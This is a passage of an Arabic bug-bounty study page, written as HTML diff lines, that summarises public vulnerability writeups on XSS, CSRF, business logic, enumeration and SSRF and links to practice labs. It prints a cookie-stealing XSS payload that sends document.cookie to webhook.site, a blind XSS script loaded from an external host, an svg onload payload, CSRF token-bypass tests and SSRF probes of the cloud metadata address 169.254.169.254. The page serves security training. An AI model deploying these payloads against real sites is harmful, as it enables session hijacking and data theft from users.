+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الثغرة</div>
+      <div class="blk-txt">الباحث اكتشف إمكانية معرفة ما إذا كان أي حساب Instagram يمتلك 2FA عبر الفرق في الـ API response. هذا يكشف معلومات خاصة عن security settings المستخدمين.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">Username Enumeration — أنواعها الثلاثة</div>
+      <div class="code">
+<span class="c"># النوع 1: Response message مختلف</span>
+<span class="v">Valid user:   "Invalid password"</span>
+<span class="d">Invalid user: "User not found"</span>
+
+<span class="c"># النوع 2: Response time مختلف</span>
+<span class="v">Valid user:   200ms  ← يتحقق من الـ password</span>
+<span class="d">Invalid user: 50ms   ← يرفض فوراً</span>
+
+<span class="c"># النوع 3: Status code مختلف</span>
+<span class="v">Valid user:   401 Unauthorized</span>
+<span class="d">Invalid user: 404 Not Found</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-g">كيف تكتشف من الموبايل</div>
+      <ol class="steps">
+        <li>في صفحة Forgot Password، أدخل email/phone موجود — سجّل الـ response</li>
+        <li>أدخل email/phone غير موجود — قارن الـ responses</li>
+        <li>حتى لو الـ message نفسه، قارن timing في DevTools Network tab</li>
+        <li>جرّب صفحة Login نفسها بنفس المنطق</li>
+        <li>جرّب API endpoint: /api/check-email أو /api/user-exists</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- Instagram Reflected XSS = Auth bypass -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(188,72,188,.1);color:#bc8cff;">INSTA</div>
+    <div class="wmeta">
+      <div class="wtitle">Instagram Reflected XSS → Account Takeover — $9,600 by Samm0uda</div>
+      <div class="wsub"><span class="badge bc">💰 $9,600</span><span class="badge br">CRITICAL</span><span class="badge bd">Facebook BB</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الدرس من هذا الـ Writeup</div>
+      <div class="blk-txt">
+        <strong>Samm0uda</strong> هو أحد أشهر باحثي Meta Bug Bounty. اكتشف XSS في صفحة Login الخاصة بـ Instagram يُمكّن من سرقة الـ session token وتحويله لـ Account Takeover. <br><br>
+        XSS في صفحات الـ Authentication = أعلى خطورة ممكنة لأنها تفتقر للحماية الإضافية.
+      </div>
+      <div class="note ny">⚡ صفحات Login وـ Password Reset هي أكثر الصفحات حساسية — اختبرها دائماً لـ XSS وـ CSRF وـ Auth bypass.</div>
+    </div>
+  </div>
+</div>
+
+<!-- HackerOne 2FA reset -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(248,81,73,.1);color:#ff7b72;">H1<br>2FA</div>
+    <div class="wmeta">
+      <div class="wtitle">Reset 2FA of any HackerOne user — Auth Logic Flaw</div>
+      <div class="wsub"><span class="badge by">HIGH</span><span class="badge bd">HackerOne — 28 upvotes</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">المفهوم</div>
+      <div class="blk-txt">الـ endpoint لإعادة ضبط 2FA لم يتحقق من الـ ownership — بتمرير user_id مستخدم آخر، يمكن إيقاف 2FA على حسابه مما يُسهّل Brute Force أو Password Reset attacks.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">Labs Auth PortSwigger</div>
+      <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" target="_blank" class="lab">🧪 Username enumeration via different responses <span class="lab-d la">Apprentice</span></a>
+      <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing" target="_blank" class="lab">🧪 Enumeration via response timing <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass" target="_blank" class="lab">🧪 2FA Simple Bypass <span class="lab-d la">Apprentice</span></a>
+      <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic" target="_blank" class="lab">🧪 2FA Broken Logic <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack" target="_blank" class="lab">🧪 2FA Bypass via brute force <span class="lab-d le">Expert</span></a>
+    </div>
+  </div>
+</div>
+
+<div class="links">
+  <a href="https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups" target="_blank" class="lnk">📋 Facebook Bug Bounty Writeups Collection — GitHub <span class="lnk-badge">ESSENTIAL</span></a>
+  <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md" target="_blank" class="lnk">📋 Top Account Takeover Reports — GitHub</a>
+  <a href="https://portswigger.net/web-security/authentication" target="_blank" class="lnk">🟢 PortSwigger Authentication Academy</a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     BUSINESS LOGIC
+════════════════════════════════════════════════════ -->
+<div id="p-logic" class="panel">
+<div class="sh">
+  <div class="sh-icon">💰</div>
+  <div><div class="sh-title">Business Logic Bugs</div><div class="sh-sub">Stripe · PayPal · Uber · Airbnb — Real Money Bugs</div></div>
+</div>
+
+<!-- Stripe unlimited discount -->
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(99,91,255,.1);color:#bc8cff;">STRIPE</div>
+    <div class="wmeta">
+      <div class="wtitle">Business Logic → Unlimited Discount Redemption in Stripe</div>
+      <div class="wsub"><span class="badge bc">💰 $5,000</span><span class="badge br">CRITICAL</span><span class="badge bd">HackerOne Official Blog</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">المنطق المكسور</div>
+      <div class="blk-txt">
+        الكوبون يُطبَّق ثم تُكتب قيمة "used=true" في قاعدة البيانات. لكن بين التطبيق والكتابة، توجد فجوة زمنية — الـ Race Condition يستغل هذه الفجوة لتطبيق الكوبون مرات عديدة.
+      </div>
+      <div class="code">
+<span class="c"># منطق التطبيق المكسور</span>
+<span class="k">1.</span> <span class="v">Check: coupon.used == false</span>  <span class="c">← TRUE</span>
+<span class="k">2.</span> <span class="v">Apply discount</span>
+<span class="k">3.</span> <span class="v">Set: coupon.used = true</span>     <span class="c">← الكتابة هنا متأخرة</span>
+
+<span class="c"># Race: إرسال 10 requests في نفس اللحظة</span>
+<span class="d">Thread 1-10: Check → false → Apply! (10 مرات!)</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">المصدر</div>
+      <a href="https://www.hackerone.com/blog/how-business-logic-vulnerability-led-unlimited-discount-redemption" target="_blank" class="lnk">📝 HackerOne Official Blog — Stripe Full Writeup <span class="lnk-badge">OFFICIAL</span></a>
+    </div>
+  </div>
+</div>
+
+<!-- Uber free rides -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(248,81,73,.1);color:#ff7b72;">UBER<br>FREE</div>
+    <div class="wmeta">
+      <div class="wtitle">Changing paymentProfileUuid → Free Rides on Uber</div>
+      <div class="wsub"><span class="badge br">CRITICAL</span><span class="badge bd">HackerOne — bug-bounty-reference</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">ملخص</div>
+      <div class="blk-txt">الباحث <strong>temmyscript</strong> اكتشف إن تغيير <code>paymentProfileUuid</code> في booking request إلى UUID حساب آخر يجعل الضحية تدفع بدلاً منك! Business Logic Bug نادر جداً.</div>
+      <div class="note nr">⚡ Payment UUIDs في أي تطبيق = اختبر IDOR عليها فوراً. تغيير ID الدفع = الضحية تدفع بدلاً منك.</div>
+    </div>
+  </div>
+</div>
+
+<!-- PayPal CSRF update profile -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(0,48,135,.1);color:#79c0ff;">PAY<br>PAL</div>
+    <div class="wmeta">
+      <div class="wtitle">PayPal — Updating PayPal.me profile picture without consent (CSRF)</div>
+      <div class="wsub"><span class="badge by">MEDIUM</span><span class="badge bd">Florian Courtial — bug-bounty-reference</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">Business Logic + CSRF</div>
+      <div class="blk-txt">بمزج Business Logic مع CSRF، تمكّن الباحث من تحديث صورة Profile بأي رابط خارجي دون موافقة المستخدم. يُظهر كيف يمكن لـ CSRF أن يُضخّم تأثير ثغرات بسيطة.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">Labs Business Logic</div>
+      <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money" target="_blank" class="lab">🧪 Infinite Money Logic Flaw <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level" target="_blank" class="lab">🧪 Low-level Logic Flaw (integer overflow) <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls" target="_blank" class="lab">🧪 Excessive trust in client-side controls <span class="lab-d la">Apprentice</span></a>
+      <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine" target="_blank" class="lab">🧪 Auth bypass via flawed state machine <span class="lab-d lp">Practitioner</span></a>
+    </div>
+  </div>
+</div>
+
+<div class="links">
+  <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPBUSINESSLOGIC.md" target="_blank" class="lnk">📋 Top Business Logic Reports — GitHub <span class="lnk-badge">ESSENTIAL</span></a>
+  <a href="https://portswigger.net/web-security/logic-flaws" target="_blank" class="lnk">🟢 PortSwigger Business Logic Academy</a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     XSS
+════════════════════════════════════════════════════ -->
+<div id="p-xss" class="panel">
+<div class="sh">
+  <div class="sh-icon">⚡</div>
+  <div><div class="sh-title">XSS — Cross-Site Scripting</div><div class="sh-sub">Facebook · Twitter · Uber · GitHub · Telegram · Google · Zoom</div></div>
+</div>
+
+<!-- Facebook Self-XSS to ATO $62,500 -->
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(24,119,242,.1);color:#79c0ff;">META<br>XSS</div>
+    <div class="wmeta">
+      <div class="wtitle">Self-XSS in Facebook Payments → Account Takeover — $62,500</div>
+      <div class="wsub"><span class="badge bc">💰 $62,500</span><span class="badge br">CRITICAL</span><span class="badge bd">Facebook BB — Youssef Sammouda — 2025</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">لماذا هذا الـ Writeup مهم جداً</div>
+      <div class="blk-txt">
+        <strong>Youssef Sammouda</strong> (أحد أفضل باحثي Bug Bounty في العالم) اكتشف Self-XSS في صفحة Payments الخاصة بـ Facebook. رغم أن Self-XSS عادةً لا يُكافأ عليه، الباحث <strong>سلسل (chain)</strong> الثغرة مع ثغرة أخرى لتحويلها لـ Account Takeover كامل.
+      </div>
+      <div class="note nr">⚡ Self-XSS alone = غالباً N/A. Self-XSS + CSRF أو CORS أو Open Redirect = CRITICAL! دائماً فكّر في الـ chaining.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">مفهوم Chaining الثغرات</div>
+      <div class="code">
+<span class="c"># Self-XSS وحده = لا قيمة</span>
+<span class="d">Self-XSS → only affects yourself</span>
+
+<span class="c"># Self-XSS + CSRF لإجبار الضحية على تنفيذه</span>
+<span class="v">Self-XSS + CSRF = affects victim → ATO!</span>
+
+<span class="c"># Self-XSS + Login CSRF</span>
+<span class="v">Force victim to login as attacker → attacker's XSS runs</span>
+<span class="v">→ steal victim's cookies/tokens</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Uber Stored XSS developer portal -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(248,81,73,.1);color:#ff7b72;">UBER<br>XSS</div>
+    <div class="wmeta">
+      <div class="wtitle">Stored XSS in developer.uber.com — Admin Cookie Theft</div>
+      <div class="wsub"><span class="badge bc">💰 $7,500</span><span class="badge br">CRITICAL</span><span class="badge bd">197 upvotes · HackerOne</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">التفاصيل</div>
+      <div class="blk-txt">حقل "Application Name" في Developer Portal لم يُنقَّى. الـ payload مُخزَّن في قاعدة البيانات — عند مراجعة الـ admin للتطبيق تُنفَّذ الـ JavaScript في متصفحه وتُرسَل cookies للمهاجم.</div>
+      <div class="code">
+<span class="c"># في حقل App Name</span>
+<span class="d">&lt;img src=x onerror="fetch('https://webhook.site/X?c='+document.cookie)"&gt;</span>
+<span class="c"># Admin يفتح الصفحة → cookies تُرسَل</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-g">أماكن Stored XSS الأكثر نجاحاً</div>
+      <div class="blk-txt">
+        • <strong>Developer/Admin portals</strong> — غالباً أقل حماية<br>
+        • Profile fields (name, bio, username)<br>
+        • Support ticket system<br>
+        • Product/App names في API dashboards<br>
+        • Comment sections<br>
+        • File names عند رفع الملفات
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Twitter SSRF cards validator -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(29,161,242,.1);color:#79c0ff;">X<br>XSS</div>
+    <div class="wmeta">
+      <div class="wtitle">Twitter (X) — Reflected XSS on www.twitter.com</div>
+      <div class="wsub"><span class="badge bd">113 upvotes · HackerOne · Top Uber/Twitter Reports</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الموقع</div>
+      <div class="blk-txt">Reflected XSS وُجد في search parameter على موقع Twitter الرئيسي. الفلتر كان يمنع بعض الـ tags لكن SVG tags لم تكن في القائمة.</div>
+      <div class="code">
+<span class="c"># Payload نجح في Twitter</span>
+<span class="d">&lt;svg/onload=alert(document.domain)&gt;</span>
+<span class="c"># لأن script وimg فُلتروا لكن svg لم يُفلتر</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Telegram Blind XSS -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(0,136,204,.1);color:#79c0ff;">TELE<br>GRAM</div>
+    <div class="wmeta">
+      <div class="wtitle">Telegram + WhatsApp — Blind XSS Stored in iOS (Messengers Twins)</div>
+      <div class="wsub"><span class="badge by">HIGH</span><span class="badge bd">omespino — Medium Writeup — VERIFIED</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">Blind XSS — ما هو</div>
+      <div class="blk-txt">
+        <strong>Blind XSS</strong> هو Stored XSS لكن الـ payload يُنفَّذ في مكان لا تراه (مثل Admin Panel أو internal tool). تكتشفه فقط عبر Out-of-Band callback.
+      </div>
+      <div class="code">
+<span class="c"># Blind XSS Payload</span>
+<span class="d">&lt;script src="https://your-xss-hunter.com/PAYLOAD"&gt;&lt;/script&gt;</span>
+<span class="c"># عند تنفيذه في أي admin page → تستقبل notification</span>
+<span class="c"># تحتوي: cookies, URL, screenshot, DOM كامل</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">كيف تختبر Blind XSS من الموبايل</div>
+      <ol class="steps">
+        <li>سجّل في XSS Hunter (xsshunter.trufflesecurity.com) واحصل على payload</li>
+        <li>ضع الـ payload في أي حقل يصل للـ admin: support tickets, app names, feedback forms</li>
+        <li>انتظر — إذا وصل admin للصفحة → تستقبل email/notification</li>
+        <li>الـ notification تحتوي URL الـ admin page، cookies، وscreenshot!</li>
+      </ol>
+      <div class="tools">
+        <span class="tool">XSS Hunter</span>
+        <span class="tool">webhook.site</span>
+        <span class="tool">Kiwi Browser</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">المصدر</div>
+      <a href="http://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/" target="_blank" class="lnk">📝 Telegram + WhatsApp Blind XSS Writeup — Omar Espino</a>
+    </div>
+  </div>
+</div>
+
+<!-- GitHub XSS -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(255,255,255,.05);color:#c9d1d9;">GIT<br>HUB</div>
+    <div class="wmeta">
+      <div class="wtitle">GitHub — Internet Explorer URL Problem → XSS</div>
+      <div class="wsub"><span class="badge bd">filedescriptor — bug-bounty-reference — VERIFIED</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الدرس</div>
+      <div class="blk-txt">الباحث <strong>filedescriptor</strong> وجد إن URL handling في GitHub كان يعاني من مشكلة في Internet Explorer تسمح بـ XSS. الدرس: نفس الكود قد يكون آمناً في Chrome لكن ثغرة في Safari أو Firefox القديمة.</div>
+      <div class="note ng">✅ اختبر دائماً في متصفحات مختلفة. Kiwi Browser = Chrome Engine. جرّب أيضاً Firefox على الموبايل لاختبار الفروق.</div>
+    </div>
+  </div>
+</div>
+
+<!-- Zoom XSS $15k -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(45,140,255,.1);color:#79c0ff;">ZOOM<br>XSS</div>
+    <div class="wmeta">
+      <div class="wtitle">Zoom — Chained XSS → OAuth Dirty Dancing → Webcam Access — $15,000</div>
+      <div class="wsub"><span class="badge bc">💰 $15,000</span><span class="badge br">CRITICAL</span><span class="badge bd">writeups.io — Team Bug — VERIFIED</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">أعقد Chain رأيناها</div>
+      <div class="blk-txt">
+        فريق من 3 باحثين (Sudi, BrunoZero, H4R3L) ربطوا: <br>
+        <strong>XSS ثغرتين عديمتا الفائدة وحدهما</strong> → OAuth Dirty Dancing (سرقة Authorization Code) → اختطاف الـ session → تشغيل الكاميرا والميكروفون عبر browser permissions سُرقت!
+      </div>
+      <div class="note nb">💡 هذا هو الـ "Chaining" الاحترافي. ثغرتان N/A وحدهما = $15,000 معاً. فكّر دائماً: ماذا لو دمجت هذه الثغرة مع ثغرة أخرى؟</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">المصدر</div>
+      <a href="https://writeups.io/" target="_blank" class="lnk">📝 writeups.io — Zoom Full Writeup <span class="lnk-badge">VERIFIED</span></a>
+    </div>
+  </div>
+</div>
+
+<!-- Google XSS Play -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(66,133,244,.1);color:#79c0ff;">GOOG<br>XSS</div>
+    <div class="wmeta">
+      <div class="wtitle">Google Play and DevSite XSS — $8,133 by NDevTK</div>
+      <div class="wsub"><span class="badge bc">💰 $8,133</span><span class="badge by">HIGH</span><span class="badge bd">Google VRP — awesome-google-vrp</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الدرس</div>
+      <div class="blk-txt"><strong>NDevTK</strong> باحث متخصص في Google VRP وجد XSS في مواقع Google المتعددة. الدرس: حتى أكبر الشركات تحتوي على XSS — الأصعب هو إثبات التأثير (exploitability) وليس الإيجاد.</div>
+    </div>
+  </div>
+</div>
+
+<div class="blk" style="background:var(--s2);border:1px solid var(--b);border-radius:8px;margin-bottom:10px;">
+  <div class="blk-title bt-g" style="margin-bottom:10px;">🧪 Labs XSS — PortSwigger</div>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank" class="lab">🧪 Reflected XSS — no encoding <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank" class="lab">🧪 Stored XSS — no encoding <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank" class="lab">🧪 DOM XSS via document.write <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-attribute-angle-brackets-html-encoded" target="_blank" class="lab">🧪 Reflected XSS — angle brackets encoded <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf" target="_blank" class="lab">🧪 XSS → CSRF <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies" target="_blank" class="lab">🧪 XSS → Cookie Stealing <span class="lab-d lp">Practitioner</span></a>
+</div>
+
+<div class="links">
+  <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md" target="_blank" class="lnk">📋 Top XSS Reports — GitHub <span class="lnk-badge">ESSENTIAL</span></a>
+  <a href="https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups" target="_blank" class="lnk">📋 Facebook XSS Writeups Collection</a>
+  <a href="https://github.com/xdavidhu/awesome-google-vrp-writeups" target="_blank" class="lnk">📋 Google VRP Writeups — GitHub</a>
+  <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="lnk">📋 XSS Cheat Sheet — PortSwigger (مرجع أساسي)</a>
+  <a href="https://writeups.io/" target="_blank" class="lnk">🌍 writeups.io — أحدث الـ writeups</a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     CSRF
+════════════════════════════════════════════════════ -->
+<div id="p-csrf" class="panel">
+<div class="sh">
+  <div class="sh-icon">🔄</div>
+  <div><div class="sh-title">CSRF — Cross-Site Request Forgery</div><div class="sh-sub">Facebook · Instagram · Twitter · Bypasses حقيقية</div></div>
+</div>
+
+<!-- Facebook CSRF $25k -->
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(24,119,242,.1);color:#79c0ff;">META<br>CSRF</div>
+    <div class="wmeta">
+      <div class="wtitle">CSRF in Instagram → Partial Account Takeover — $25,000</div>
+      <div class="wsub"><span class="badge bc">💰 $25,000</span><span class="badge br">CRITICAL</span><span class="badge bd">Mohamed Laajimi — Facebook BB</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">التفاصيل</div>
+      <div class="blk-txt">
+        CSRF في صفحة إعدادات Instagram سمح بتغيير email المستخدم دون علمه. Facebook كانت تحمي باستخدام <code>fb_dtsg</code> token، لكن الباحث وجد endpoint لا يتحقق منه بشكل صحيح.
+      </div>
+      <div class="note ny">💡 Facebook تحمي بـ fb_dtsg token. إذا وجدت endpoint لا يطلب هذا الـ token أو يقبل قيمة فارغة → CSRF مؤكد.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">CSRF Bypass Checklist</div>
+      <div class="code">
+<span class="c"># Test 1: حذف الـ token</span>
+<span class="d">POST /change-email  (بدون csrf_token)</span>
+
+<span class="c"># Test 2: Token فارغ</span>
+<span class="d">csrf_token=</span>
+
+<span class="c"># Test 3: Token عشوائي</span>
+<span class="d">csrf_token=aaabbbccc</span>
+
+<span class="c"># Test 4: Token من حساب آخر</span>
+<span class="d">csrf_token=OTHER_USER_VALID_TOKEN</span>
+
+<span class="c"># Test 5: تغيير Method</span>
+<span class="d">GET /<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e6858e87888183cb838b878f8ad9838b878f8adb87929287858d8394a69ec885898b">[email&#160;protected]</a></span>
+
+<span class="c"># Test 6: تغيير Content-Type</span>
+<span class="d">Content-Type: text/plain (بدل application/json)</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ZSeano CSRF blank token -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(227,179,65,.1);color:#e3b341;">Z<br>CSRF</div>
+    <div class="wmeta">
+      <div class="wtitle">CSRF Bypass — Blank Token + Clickjacking → Email Change (4-digit bounty)</div>
+      <div class="wsub"><span class="badge bc">💰 4-digit bounty</span><span class="badge by">HIGH</span><span class="badge bd">ZSeano — BugBountyHunter</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الـ Bypass الذكي</div>
+      <div class="blk-txt">
+        إرسال token فارغ كان يُرجع: <strong>"CSRF_token is invalid. Please submit again."</strong> لكن التغيير كان يُعكس على الصفحة! الـ email تغيّر في الـ response لكن لم يُحفَظ. <br><br>
+        الحل: <strong>iframe + Clickjacking</strong> لإجبار الضحية على الضغط "Submit" فيحفظ التغيير فعلاً.
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">المصدر الرسمي</div>
+      <a href="https://www.bugbountyhunter.com/vulnerability/?type=csrf" target="_blank" class="lnk">📝 BugBountyHunter — ZSeano CSRF Guide (Real Bypass) <span class="lnk-badge">VERIFIED</span></a>
+    </div>
+  </div>
+</div>
+
+<!-- Airbnb CSRF -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(255,90,90,.1);color:#ff7b72;">AIR<br>BNB</div>
+    <div class="wmeta">
+      <div class="wtitle">Airbnb — XSS WAF Bypass + CSRF Chain → 8 Vulnerabilities</div>
+      <div class="wsub"><span class="badge br">CRITICAL CHAIN</span><span class="badge bd">Awesome Bug Bounty Writeups</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الـ Chain المذهلة</div>
+      <div class="blk-txt">
+        الباحث وجد XSS في Airbnb لكن WAF يمنعه. بـ JSON encoding bypass + WAF bypass + CSP bypass + Clickjacking = 8 ثغرات مترابطة من نقطة واحدة. هذا هو التفكير المتقدم في Bug Bounty.
+      </div>
+      <div class="note ng">✅ WAF لا يعني End of Road. JSON encoding, Unicode, Double URL encoding = طرق bypass شائعة.</div>
+    </div>
+  </div>
+</div>
+
+<div class="blk" style="background:var(--s2);border:1px solid var(--b);border-radius:8px;margin-bottom:10px;">
+  <div class="blk-title bt-g" style="margin-bottom:10px;">🧪 Labs CSRF — PortSwigger</div>
+  <a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank" class="lab">🧪 CSRF — No defenses <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session" target="_blank" class="lab">🧪 Token not tied to session <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-is-tied-to-non-session-cookie" target="_blank" class="lab">🧪 Token tied to non-session cookie <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect" target="_blank" class="lab">🧪 SameSite Strict bypass via redirect <span class="lab-d lp">Practitioner</span></a>
+</div>
+
+<div class="links">
+  <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPCSRF.md" target="_blank" class="lnk">📋 Top CSRF Reports — GitHub</a>
+  <a href="https://github.com/devanshbatham/Awesome-Bugbounty-Writeups" target="_blank" class="lnk">📋 Awesome Bug Bounty Writeups — CSRF Section</a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     SSRF
+════════════════════════════════════════════════════ -->
+<div id="p-ssrf" class="panel">
+<div class="sh">
+  <div class="sh-icon">🌐</div>
+  <div><div class="sh-title">SSRF — Server Side Request Forgery</div><div class="sh-sub">GitLab · Twitter · Google · DuckDuckGo · IBM · Airbnb</div></div>
+</div>
+
+<!-- GitLab SSRF $4k -->
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(252,109,38,.1);color:#e3b341;">GIT<br>LAB</div>
+    <div class="wmeta">
+      <div class="wtitle">Unauthenticated Blind SSRF in GitLab via Jira OAuth Controller</div>
+      <div class="wsub"><span class="badge bc">💰 $4,000</span><span class="badge by">HIGH</span><span class="badge bd">231 upvotes · HackerOne</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">التفاصيل</div>
+      <div class="blk-txt">
+        GitLab integration مع Jira كانت تقبل URL من المستخدم بدون authentication. تمرير <code>http://169.254.169.254/latest/meta-data/</code> جعل الـ server يستعلم AWS metadata service.
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">SSRF من الموبايل خطوة بخطوة</div>
+      <ol class="steps">
+        <li>افتح webhook.site — انسخ الـ URL الخاص بك</li>
+        <li>في Tamper Dev، ابحث عن أي parameter: url=, callback=, webhook=, dest=, host=, image=</li>
+        <li>ضع URL الـ webhook بدلاً من القيمة الأصلية</li>
+        <li>أرسل — إذا وصل request لـ webhook = SSRF!</li>
+        <li>ثم جرّب: http://127.0.0.1, http://169.254.169.254/latest/meta-data/iam/</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- Twitter SSRF cards validator -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
